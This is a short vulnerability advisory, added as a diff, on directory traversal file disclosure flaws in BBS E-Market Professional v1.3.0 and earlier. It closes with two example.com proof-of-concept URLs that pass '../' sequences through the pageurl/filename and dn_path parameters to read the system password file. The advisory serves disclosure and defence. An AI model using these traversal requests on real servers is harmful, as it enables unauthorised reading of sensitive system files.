@@ -1,0 +1,12 @@
+source: http://www.securityfocus.com/bid/11191/info
+
+BBS E-Market Professional is reported prone to multiple file disclosure vulnerabilities. These issues exist due to insufficient sanitization of user-supplied data.
+
+A remote attacker can disclose arbitrary Web-readable files by supplying directory traversal sequences such as '../' to the server. This results in improper access to potentially sensitive files located outside of the document root of the web server. 
+
+BBS E-Market patch level bf_130 (v1.3.0) and prior are affected by these issues.
+
+http://www.example.com/bemarket/shop/index.php?pageurl=viewpage&
+filename=../../../../../../../../[etc]/[passwd]
+http://www.example.com/becommunity/board/f_down.php?dn_path=
+/../../../../../../../../../[etc]/[passwd]
